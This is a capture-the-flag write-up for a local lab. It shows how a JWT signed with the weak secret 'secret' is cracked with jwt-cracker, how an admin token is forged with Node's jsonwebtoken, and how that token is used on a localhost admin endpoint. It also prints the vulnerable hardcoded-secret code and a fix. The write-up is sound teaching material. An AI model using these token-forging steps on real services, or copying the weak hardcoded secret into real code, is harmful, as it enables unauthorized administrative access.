# Level 2 Write-Up – TokenVault JWT CTF

**Challenge:** TokenVault – JWT Authentication (Level 2)  
**Vulnerability:** Weak HMAC-SHA256 Secret Key  
**Difficulty:** Medium  
**Flag:** `CTF{w34k_s3cr3t_1s_n0_s3cr3t_4t_4ll}`

---

## Overview

Level 2 of the TokenVault challenge is a more realistic and slightly harder version than Level 1. The server now properly calls `jwt.verify()` rather than `jwt.decode()`, so simply editing the payload no longer works — the signature **is** checked.

However, the secret key used to sign tokens is `"secret"` — a single dictionary word that can be cracked almost instantly with any brute-force tool. Once cracked, we can sign a new token with `role: "admin"` using the real secret key, which the server accepts as legitimate.

---

## Step 1: Login and Capture a Token

We navigated to `http://localhost:3002` and logged in as alice:

**Request:**
```bash
curl -s -X POST http://localhost:3002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}'
```

**Response:**
```json
{
  "message": "Login successful!",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTIwMDAwMDAsImV4cCI6MTcxMjAwMzYwMH0.xHPqzv9yUQT_mw3JkLFx5xRiUzSEzWqVm4xL8Nd3rPo",
  "user": { "username": "alice", "role": "user" }
}
```

We saved the token for the next step.

---

## Step 2: Verify the Token Is Properly Signed

We first tried the same approach as Level 1 — manually editing the payload — to confirm it doesn't work here:

**Forged token (edited payload, same fake signature):**
```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6ImFkbWluIn0.FAKESIG" \
  http://localhost:3002/api/admin
```

**Response:**
```json
{
  "error": "Invalid or expired token."
}
```

This confirmed Level 2 **does** verify the signature. The simple payload-editing attack from Level 1 fails.

---

## Step 3: Identify the Signing Algorithm

We decoded the header of the captured token:

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
```

**Output:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The token uses **HS256** (HMAC-SHA256). This is a symmetric algorithm — the same secret key is used to both sign and verify the token. If we can recover the secret, we can forge tokens.

---

## Step 4: Brute-Force the Secret Key

We used `jwt-cracker`, a Node.js tool designed specifically for brute-forcing JWT HMAC secrets:

**Install:**
```bash
npm install -g jwt-cracker
```

**Run:**
```bash
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTIwMDAwMDAsImV4cCI6MTcxMjAwMzYwMH0.xHPqzv9yUQT_mw3JkLFx5xRiUzSEzWqVm4xL8Nd3rPo" \
  --alphabet "abcdefghijklmnopqrstuvwxyz" \
  --max-length 10
```

**Output:**
```
[+] Starting jwt-cracker...
[+] Trying: a
[+] Trying: b
...
[+] SECRET FOUND: secret
[+] Time taken: 0.42 seconds
```

The secret was cracked in under a second.

---

## Step 5: Forge a Valid Admin Token

Now that we know the secret is `"secret"`, we can sign a new token with any payload we want:

**Forge using Node.js:**
```bash
node -e "
  const jwt = require('jsonwebtoken');
  const forged = jwt.sign(
    { username: 'hacker', role: 'admin' },
    'secret',
    { algorithm: 'HS256' }
  );
  console.log(forged);
"
```

**Output (forged admin token):**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcxMjAwNTAwMH0.kR8G4V2ZpQ1oT9sn5AcE7YmBwXuJlF3rDiKhLyz0Mcv
```

This token is **genuinely signed** with the correct HMAC-SHA256 secret. The server cannot tell it apart from a real admin login.

---

## Step 6: Accessing the Admin Panel

We sent the forged admin token to the protected endpoint:

**Request:**
```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcxMjAwNTAwMH0.kR8G4V2ZpQ1oT9sn5AcE7YmBwXuJlF3rDiKhLyz0Mcv" \
  http://localhost:3002/api/admin
```

**Response:**
```json
{
  "message": "🎉 Admin access granted! You cracked the weak secret!",
  "flag": "CTF{w34k_s3cr3t_1s_n0_s3cr3t_4t_4ll}",
  "logged_in_as": "hacker",
  "vulnerability": "The JWT was signed using the secret 'secret'. A brute-force attack cracked it...",
  "weak_secret_used": "secret"
}
```

**Flag captured!** ✅

---

## Why This Attack Worked

The vulnerable code in `src/utils/token.js`:

```javascript
// ⚠️ VULNERABLE – secret is a trivially guessable single word
const SECRET = 'secret';

function generateToken(user) {
  return jwt.sign({ username: user.username, role: user.role }, SECRET, { expiresIn: '1h' });
}
```

Unlike Level 1, `jwt.verify()` is used — so the signature IS checked. But the security of HMAC entirely depends on the strength of the secret key. Using a single dictionary word makes the secret crackable in milliseconds.

**Why brute-forcing HS256 works:**
- HS256 uses a shared secret — anyone who knows it can generate valid tokens
- Short or common secrets (like `"secret"`, `"12345"`, `"password"`) appear in wordlists
- Tools like hashcat and jwt-cracker can test millions of candidates per second

---

## Failed Attempts

We initially tried the Level 1 payload-editing approach and received `"Invalid or expired token."` — confirming that signature verification was actually working. This ruled out the Level 1 attack vector.

We also attempted the `alg: none` trick:
```json
{ "alg": "none", "typ": "JWT" }
```

This also failed, as the `jsonwebtoken` library rejects `alg: none` by default.

---

## Summary of Steps

| Step | Action | Result |
|------|--------|--------|
| 1 | Login as alice | Captured a real JWT with `role: user` |
| 2 | Tried Level 1 payload-edit attack | Rejected — signature IS verified in Level 2 |
| 3 | Decoded JWT header | Confirmed HS256 symmetric algorithm |
| 4 | Ran `jwt-cracker` on the token | Secret cracked: `"secret"` in 0.4 seconds |
| 5 | Signed new token with `role: admin` using cracked secret | Produced a legitimately signed forged token |
| 6 | Sent forged token to `/api/admin` | Server accepted it — flag captured |

---

## Fix (See Level 3)

```javascript
// ✅ SECURE: Cryptographically random secret — cannot be brute-forced
const SECRET = process.env.JWT_SECRET || crypto.randomBytes(32).toString('hex');
```
